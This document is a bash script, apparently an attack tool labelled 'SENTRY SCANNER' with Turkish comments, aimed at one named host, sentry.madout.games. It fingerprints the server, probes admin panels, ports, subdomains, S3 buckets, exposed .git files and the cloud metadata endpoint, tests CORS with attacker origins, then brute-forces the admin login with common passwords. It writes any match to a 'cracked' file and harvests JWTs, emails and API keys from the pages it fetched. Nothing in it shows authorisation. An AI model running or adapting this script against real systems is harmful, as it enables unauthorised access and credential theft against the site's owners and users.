#!/bin/bash

# ============================================
# SENTRY SCANNER - TÜM ÖZELLİKLER
# Hiçbir yerde takılma yok, timeout ile
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE="https://sentry.madout.games"
BASE_HTTP="http://sentry.madout.games"
OUTPUT_DIR="sentry_results"
TIMEOUT=2
mkdir -p "$OUTPUT_DIR"
mkdir -p "$OUTPUT_DIR/data"

echo -e "${BLUE}=====================================${NC}"
echo -e "${BLUE}  SENTRY SCANNER - TÜM ÖZELLİKLER${NC}"
echo -e "${BLUE}=====================================${NC}"
echo "Started: $(date)"
echo ""

# ============================================
# 1. CSRF TOKEN AL
# ============================================
echo -e "${YELLOW}[1] Getting CSRF Token${NC}"
curl -k -s -c "$OUTPUT_DIR/cookies.txt" "$BASE/auth/login/" > "$OUTPUT_DIR/login_page.html" 2>/dev/null
CSRF_TOKEN=$(grep -oE 'name="csrfmiddlewaretoken" value="[^"]*"' "$OUTPUT_DIR/login_page.html" 2>/dev/null | head -1 | sed 's/.*value="//;s/"//')
if [ -z "$CSRF_TOKEN" ]; then
    CSRF_TOKEN=$(sed -n 's/.*csrfmiddlewaretoken" value="\([^"]*\)".*/\1/p' "$OUTPUT_DIR/login_page.html" 2>/dev/null | head -1)
fi
[ -n "$CSRF_TOKEN" ] && echo -e "${GREEN}[+] CSRF Token: $CSRF_TOKEN${NC}" || echo -e "${RED}[-] CSRF token not found${NC}"
echo ""

# ============================================
# 2. GÜVENLİK HEADER'LARI
# ============================================
echo -e "${YELLOW}[2] Security Headers${NC}"
curl -k -s -I "$BASE/" > "$OUTPUT_DIR/data/headers.txt" 2>/dev/null
for h in "Server" "X-Powered-By" "X-Frame-Options" "Strict-Transport-Security" "X-Content-Type-Options" "Access-Control-Allow-Origin"; do
    v=$(grep -i "^$h:" "$OUTPUT_DIR/data/headers.txt" 2>/dev/null | head -1 | sed 's/^[^:]*://;s/^[[:space:]]*//')
    [ -n "$v" ] && echo -e "${GREEN}[+] $h: $v${NC}" || echo -e "${RED}[-] $h: NOT SET${NC}"
done
echo ""

# ============================================
# 3. SSL CERTIFICATE
# ============================================
echo -e "${YELLOW}[3] SSL Certificate${NC}"
if command -v openssl &> /dev/null; then
    (openssl s_client -connect sentry.madout.games:443 -servername sentry.madout.games 2>/dev/null </dev/null | openssl x509 -text -noout > "$OUTPUT_DIR/data/ssl_cert.txt" 2>/dev/null) &
    pid=$!
    sleep 3
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    [ -s "$OUTPUT_DIR/data/ssl_cert.txt" ] && echo -e "${GREEN}[+] OK${NC}" || echo -e "${RED}[-] FAIL${NC}"
else
    echo -e "${YELLOW}SKIP (openssl not installed)${NC}"
fi
echo ""

# ============================================
# 4. DNS ENUMERATION
# ============================================
echo -e "${YELLOW}[4] DNS Enumeration${NC}"
if command -v dig &> /dev/null; then
    (dig madout.games ANY +short > "$OUTPUT_DIR/data/dns_records.txt" 2>/dev/null) &
    pid=$!
    sleep 3
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    [ -s "$OUTPUT_DIR/data/dns_records.txt" ] && echo -e "${GREEN}[+] OK${NC}" || echo -e "${RED}[-] NO records${NC}"
elif command -v nslookup &> /dev/null; then
    (nslookup madout.games > "$OUTPUT_DIR/data/dns_nslookup.txt" 2>/dev/null) &
    pid=$!
    sleep 3
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    [ -s "$OUTPUT_DIR/data/dns_nslookup.txt" ] && echo -e "${GREEN}[+] OK${NC}" || echo -e "${RED}[-] NO records${NC}"
else
    echo -e "${YELLOW}SKIP (dig/nslookup not installed)${NC}"
fi
echo ""

# ============================================
# 5. CORS TESTİ
# ============================================
echo -e "${YELLOW}[5] CORS Testing${NC}"
for origin in "https://evil.com" "https://attacker.com" "null"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" -H "Origin: $origin" "$BASE/api/0/" --connect-timeout $TIMEOUT 2>/dev/null)
    [ "$r" == "200" ] || [ "$r" == "302" ] && echo -e "${GREEN}[+] $origin ACCEPTED${NC}" || echo -e "${RED}[-] $origin REJECTED${NC}"
done
echo ""

# ============================================
# 6. COOKIE GÜVENLİK
# ============================================
echo -e "${YELLOW}[6] Cookie Security${NC}"
if [ -f "$OUTPUT_DIR/cookies.txt" ]; then
    grep -qi "HttpOnly" "$OUTPUT_DIR/cookies.txt" && echo -e "${GREEN}[+] HttpOnly: YES${NC}" || echo -e "${RED}[-] HttpOnly: NO${NC}"
    grep -qi "Secure" "$OUTPUT_DIR/cookies.txt" && echo -e "${GREEN}[+] Secure: YES${NC}" || echo -e "${RED}[-] Secure: NO${NC}"
    grep -qi "SameSite" "$OUTPUT_DIR/cookies.txt" && echo -e "${GREEN}[+] SameSite: YES${NC}" || echo -e "${RED}[-] SameSite: NO${NC}"
fi
echo ""

# ============================================
# 7. GRAPHQL
# ============================================
echo -e "${YELLOW}[7] GraphQL${NC}"
for ep in "/graphql" "/api/graphql" "/query"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST "$BASE$ep" -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name}}}"}' --connect-timeout $TIMEOUT 2>/dev/null)
    [ "$r" == "200" ] && echo -e "${GREEN}[+] $ep FOUND${NC}" || echo -e "${RED}[-] $ep NO${NC}"
done
echo ""

# ============================================
# 8. SERVİS KEŞFİ
# ============================================
echo -e "${YELLOW}[8] Services${NC}"
services=(
    "/phpmyadmin/" "/pma/" "/jenkins/" "/grafana/" "/metrics"
    "/prometheus/" "/kibana/" "/swagger/" "/api-docs/" "/minio/"
    "/lab/" "/tree/" "/notebooks/" "/rabbitmq/" "/v1/sys/health"
    "/wordpress/" "/wp-admin/" "/wp-login.php" "/xmlrpc.php"
)
for s in "${services[@]}"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE$s" --connect-timeout $TIMEOUT 2>/dev/null)
    if [ "$r" == "200" ] || [ "$r" == "302" ] || [ "$r" == "401" ] || [ "$r" == "403" ]; then
        echo -e "${GREEN}[+] $s ($r)${NC}"
        echo "$s ($r)" >> "$OUTPUT_DIR/data/services.txt"
    fi
done
echo ""

# ============================================
# 9. PORT TARAMA (curl ile, nc yok)
# ============================================
echo -e "${YELLOW}[9] Ports${NC}"
for port in 80 443 8080 8443 3000 5000 8000 9000 9443 9090 15672 5672 6379 9200 27017; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "https://sentry.madout.games:$port" 2>/dev/null)
    if [ "$r" != "000" ] && [ "$r" != "404" ]; then
        echo -e "${GREEN}[+] $port ($r)${NC}"
        echo "$port ($r)" >> "$OUTPUT_DIR/data/ports.txt"
    fi
done
echo ""

# ============================================
# 10. SUBDOMAIN HTTP TEST
# ============================================
echo -e "${YELLOW}[10] Subdomains${NC}"
subs=("api" "admin" "dev" "test" "staging" "backup" "dashboard" "panel" "console" "monitor" "logs" "cdn" "static" "media" "auth" "login" "account" "profile" "support" "help" "docs")
for s in "${subs[@]}"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "https://$s.madout.games" --connect-timeout 2 2>/dev/null)
    if [ "$r" == "200" ] || [ "$r" == "301" ] || [ "$r" == "302" ] || [ "$r" == "401" ] || [ "$r" == "403" ]; then
        echo -e "${GREEN}[+] $s.madout.games ($r)${NC}"
        echo "$s.madout.games ($r)" >> "$OUTPUT_DIR/data/subdomains.txt"
    fi
done
echo ""

# ============================================
# 11. DNS SUBDOMAIN VALIDATION
# ============================================
echo -e "${YELLOW}[11] DNS Subdomain Validation${NC}"
if command -v dig &> /dev/null; then
    for s in "${subs[@]}"; do
        (ip=$(dig "$s.madout.games" A +short 2>/dev/null | head -1); [ -n "$ip" ] && echo "$s.madout.games -> $ip" >> "$OUTPUT_DIR/data/dns_validated.txt") &
    done
    wait
    [ -s "$OUTPUT_DIR/data/dns_validated.txt" ] && echo -e "${GREEN}[+] $(cat "$OUTPUT_DIR/data/dns_validated.txt" | wc -l) found${NC}" || echo -e "${RED}[-] None found${NC}"
else
    echo -e "${YELLOW}SKIP (dig not installed)${NC}"
fi
echo ""

# ============================================
# 12. S3 BUCKET (TAKILMA YOK)
# ============================================
echo -e "${YELLOW}[12] S3 Buckets${NC}"
buckets=("sentry.madout.games" "sentry-madout-games" "madout-games" "sentry-backup" "sentry-static")
for b in "${buckets[@]}"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "https://$b.s3.amazonaws.com/" --connect-timeout 2 2>/dev/null)
    [ "$r" == "200" ] || [ "$r" == "403" ] && echo -e "${GREEN}[+] $b.s3.amazonaws.com ($r)${NC}" && echo "$b.s3.amazonaws.com ($r)" >> "$OUTPUT_DIR/data/s3_buckets.txt"
done
echo ""

# ============================================
# 13. .git EXPLOIT (TAKILMA YOK)
# ============================================
echo -e "${YELLOW}[13] .git Exploit${NC}"
for f in "/.git/config" "/.git/HEAD" "/.git/index"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE$f" --connect-timeout 2 2>/dev/null)
    [ "$r" == "200" ] && echo -e "${GREEN}[+] $f ($r)${NC}" && echo "$f ($r)" >> "$OUTPUT_DIR/data/git_found.txt"
done
echo ""

# ============================================
# 14. AWS METADATA (TAKILMA YOK)
# ============================================
echo -e "${YELLOW}[14] AWS Metadata${NC}"
for p in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/user-data/"; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "$p" 2>/dev/null)
    [ "$r" == "200" ] && echo -e "${GREEN}[+] $p ACCESSIBLE${NC}" && echo "$p" >> "$OUTPUT_DIR/data/aws_metadata.txt"
done
echo ""

# ============================================
# 15. WAYBACK MACHINE (TAKILMA YOK)
# ============================================
echo -e "${YELLOW}[15] Wayback Machine${NC}"
(curl -k -s "https://archive.org/wayback/available?url=sentry.madout.games" > "$OUTPUT_DIR/data/wayback.json" 2>/dev/null) &
pid=$!
sleep 3
kill $pid 2>/dev/null
wait $pid 2>/dev/null
[ -s "$OUTPUT_DIR/data/wayback.json" ] && echo -e "${GREEN}[+] OK${NC}" || echo -e "${RED}[-] FAIL${NC}"
echo ""

# ============================================
# 16. GITHUB SEARCH (TAKILMA YOK)
# ============================================
echo -e "${YELLOW}[16] GitHub Search${NC}"
(curl -k -s "https://api.github.com/search/code?q=sentry.madout.games" > "$OUTPUT_DIR/data/github_raw.json" 2>/dev/null) &
pid=$!
sleep 3
kill $pid 2>/dev/null
wait $pid 2>/dev/null
[ -s "$OUTPUT_DIR/data/github_raw.json" ] && echo -e "${GREEN}[+] OK${NC}" || echo -e "${RED}[-] FAIL${NC}"
echo ""

# ============================================
# 17. RATE LIMIT TEST
# ============================================
echo -e "${YELLOW}[17] Rate Limit${NC}"
limited=0
for i in {1..30}; do
    r=$(curl -k -s -o /dev/null -w "%{http_code}" -b "$OUTPUT_DIR/cookies.txt" "$BASE/auth/login/" --connect-timeout 2 2>/dev/null)
    [ "$r" == "429" ] && { limited=$i; break; }
done
[ "$limited" -gt 0 ] && echo -e "${GREEN}[+] Rate limited at $limited${NC}" || echo -e "${GREEN}[+] No rate limit${NC}"
echo ""

# ============================================
# 18. BRUTE FORCE
# ============================================
echo -e "${YELLOW}[18] Brute Force${NC}"
if [ -n "$CSRF_TOKEN" ]; then
    for pass in "admin" "password" "123456" "qwerty" "admin123" "sentry" "madout" "test"; do
        r=$(curl -k -s -o /dev/null -w "%{http_code}" -X POST "$BASE/auth/login/" -H "Content-Type: application/x-www-form-urlencoded" -b "$OUTPUT_DIR/cookies.txt" -c "$OUTPUT_DIR/cookies.txt" -d "csrfmiddlewaretoken=$CSRF_TOKEN&username=admin&password=$pass&op=login" --connect-timeout 2 2>/dev/null)
        [ "$r" == "302" ] || [ "$r" == "200" ] && echo -e "${GREEN}[+] SUCCESS: $pass${NC}" && echo "admin:$pass" >> "$OUTPUT_DIR/data/cracked.txt" && break
    done
fi
echo ""

# ============================================
# 19. JWT TOKEN
# ============================================
echo -e "${YELLOW}[19] JWT Tokens${NC}"
for f in "$OUTPUT_DIR"/*.html "$OUTPUT_DIR"/*/*.html "$OUTPUT_DIR"/*.json 2>/dev/null; do
    [ -f "$f" ] && grep -oE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$f" 2>/dev/null >> "$OUTPUT_DIR/data/jwt_tokens.txt"
done
[ -s "$OUTPUT_DIR/data/jwt_tokens.txt" ] && echo -e "${GREEN}[+] $(cat "$OUTPUT_DIR/data/jwt_tokens.txt" | wc -l) found${NC}" || echo -e "${RED}[-] None${NC}"
echo ""

# ============================================
# 20. VERİ ÇIKARMA
# ============================================
echo -e "${YELLOW}[20] Extracting Data${NC}"
for f in "$OUTPUT_DIR"/*.html "$OUTPUT_DIR"/*/*.html "$OUTPUT_DIR"/*.json 2>/dev/null; do
    [ -f "$f" ] && {
        grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" "$f" 2>/dev/null >> "$OUTPUT_DIR/data/emails.txt"
        grep -oE "(sk-[a-zA-Z0-9]{32,}|pk_[a-zA-Z0-9]{32,})" "$f" 2>/dev/null >> "$OUTPUT_DIR/data/api_keys.txt"
    }
done
for f in emails.txt api_keys.txt; do
    [ -f "$OUTPUT_DIR/data/$f" ] && sort -u "$OUTPUT_DIR/data/$f" -o "$OUTPUT_DIR/data/$f" 2>/dev/null
done
echo -e "${GREEN}[+] Emails: $(cat "$OUTPUT_DIR/data/emails.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${GREEN}[+] API Keys: $(cat "$OUTPUT_DIR/data/api_keys.txt" 2>/dev/null | wc -l)${NC}"
echo ""

# ============================================
# FINAL REPORT
# ============================================
echo -e "${BLUE}=====================================${NC}"
echo -e "${GREEN}SCAN COMPLETE!${NC}"
echo -e "${BLUE}=====================================${NC}"
echo ""
echo -e "${YELLOW}SUMMARY:${NC}"
echo -e "${CYAN}Subdomains: $(cat "$OUTPUT_DIR/data/subdomains.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}DNS Validated: $(cat "$OUTPUT_DIR/data/dns_validated.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Services: $(cat "$OUTPUT_DIR/data/services.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Ports: $(cat "$OUTPUT_DIR/data/ports.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}S3 Buckets: $(cat "$OUTPUT_DIR/data/s3_buckets.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}.git exposed: $(cat "$OUTPUT_DIR/data/git_found.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}JWT Tokens: $(cat "$OUTPUT_DIR/data/jwt_tokens.txt" 2>/dev/null | wc -l)${NC}"
echo ""
[ -f "$OUTPUT_DIR/data/cracked.txt" ] && [ -s "$OUTPUT_DIR/data/cracked.txt" ] && echo -e "${RED}[!] CRACKED: $(cat "$OUTPUT_DIR/data/cracked.txt")${NC}"
[ -f "$OUTPUT_DIR/data/api_keys.txt" ] && [ -s "$OUTPUT_DIR/data/api_keys.txt" ] && echo -e "${RED}[!] API KEYS: $(cat "$OUTPUT_DIR/data/api_keys.txt")${NC}"
echo ""
echo -e "${BLUE}=====================================${NC}"
